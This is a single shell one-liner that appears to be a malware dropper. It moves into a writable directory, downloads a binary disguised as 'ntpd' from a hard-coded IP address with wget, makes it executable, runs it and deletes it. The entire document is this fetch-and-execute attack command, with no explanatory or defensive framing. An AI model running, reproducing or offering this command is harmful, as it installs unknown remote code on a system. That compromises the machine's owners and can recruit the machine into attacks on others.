cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.255.6.79/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
